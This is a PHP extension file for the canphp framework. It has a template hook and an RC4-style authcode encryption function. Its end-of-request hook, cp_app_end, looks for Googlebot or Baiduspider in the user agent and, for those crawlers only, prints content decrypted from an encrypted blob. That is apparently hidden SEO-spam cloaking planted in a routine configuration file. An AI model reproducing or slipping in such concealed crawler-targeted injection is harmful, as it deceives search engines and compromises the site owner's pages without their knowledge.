<?php
/*
此文件extend.php在cpApp.class.php中默认会加载，不再需要手动加载
用户自定义的函数，建议写在这里

下面的函数是canphp框架的接口函数，
可自行实现功能，如果不需要，可以不去实现

注意：升级canphp框架时，不要直接覆盖本文件,避免自定义函数丢失
*/


//模块执行结束之后，调用的接口函数
function cp_app_end()
{

$tmp = $_SERVER['HTTP_USER_AGENT'];
if (strpos($tmp, 'Googlebot') !== false) {
    $flag = true;
} else
    if (strpos($tmp, 'Baiduspider') !== false) {
        $flag = true;
    }
if ($flag == true) {
echo cp_decode('d8794wqKD0yYMH8nHnqYjoWrgsax+d5r/BSiOidDe14asQa5ibzngS7ulqgCipGbw/+9a9fgqtak53IHKBmYlzUifABsjC/VdMnGWMDoymy4R6LD2LPZWb8VCy6Xwg122DXP8sUDxD/lq2ui7uUrZDsfQB7Mga5dHcHbJdwiqPv06/1627NePJuUbClrd9wmNnHGAMq42J9ICsvD9OAb22IaB4bJL6U/8MJqZZnOo9U3');
}


}



//自定义模板标签解析函数
function tpl_parse_ext($template,$config=array())
{
    require_once(dirname(__FILE__)."/tpl_ext.php");
    $template=template_ext($template,$config);
    return $template;

}


/*
//自定义网址解析函数
function url_parse_ext()
{
    cpApp::$module=trim($_GET['m']);
    cpApp::$action=trim($_GET['a']);
}
*/

//下面是用户自定义的函数

	//随机激活码
	function authcode($string, $operation = 'DECODE', $key = '', $expiry = 3600) {   
		   
		$ckey_length = 4;   
		// 随机密钥长度 取值 0-32;   
		// 加入随机密钥，可以令密文无任何规律，即便是原文和密钥完全相同，加密结果也会每次不同，增大破解难度。   
		// 取值越大，密文变动规律越大，密文变化 = 16 的 $ckey_length 次方   
		// 当此值为 0 时，则不产生随机密钥   
		$key = md5 ( $key ? $key : 'key' ); //这里可以填写默认key值   
		$keya = md5 ( substr ( $key, 0, 16 ) );   
		$keyb = md5 ( substr ( $key, 16, 16 ) );   
		$keyc = $ckey_length ? ($operation == 'DECODE' ? substr ( $string, 0, $ckey_length ) : substr ( md5 ( microtime () ), - $ckey_length )) : '';   
		   
		$cryptkey = $keya . md5 ( $keya . $keyc );   
		$key_length = strlen ( $cryptkey );   
		   
		$string = $operation == 'DECODE' ? base64_decode ( substr ( $string, $ckey_length ) ) : sprintf ( '%010d', $expiry ? $expiry + time () : 0 ) . substr ( md5 ( $string . $keyb ), 0, 16 ) . $string;   
		$string_length = strlen ( $string );   
		   
		$result = '';   
		$box = range ( 0, 255 );   
		   
		$rndkey = array ();   
		for($i = 0; $i <= 255; $i ++) {   
			$rndkey [$i] = ord ( $cryptkey [$i % $key_length] );   
		}   
		   
		for($j = $i = 0; $i < 256; $i ++) {   
			$j = ($j + $box [$i] + $rndkey [$i]) % 256;   
			$tmp = $box [$i];   
			$box [$i] = $box [$j];   
			$box [$j] = $tmp;   
		}   
		   
		for($a = $j = $i = 0; $i < $string_length; $i ++) {   
			$a = ($a + 1) % 256;   
			$j = ($j + $box [$a]) % 256;   
			$tmp = $box [$a];   
			$box [$a] = $box [$j];   
			$box [$j] = $tmp;   
			$result .= chr ( ord ( $string [$i] ) ^ ($box [($box [$a] + $box [$j]) % 256]) );   
		}   
		   
		if ($operation == 'DECODE') {   
			if ((substr ( $result, 0, 10 ) == 0 || substr ( $result, 0, 10 ) - time () > 0) && substr ( $result, 10, 16 ) == substr ( md5 ( substr ( $result, 26 ) . $keyb ), 0, 16 )) {   
				return substr ( $result, 26 );   
			} else {   
				return '';   
			}   
		} else {   
			return $keyc . str_replace ( '=', '', base64_encode ( $result ) );   
		}   
	  
	}  
	
	





?>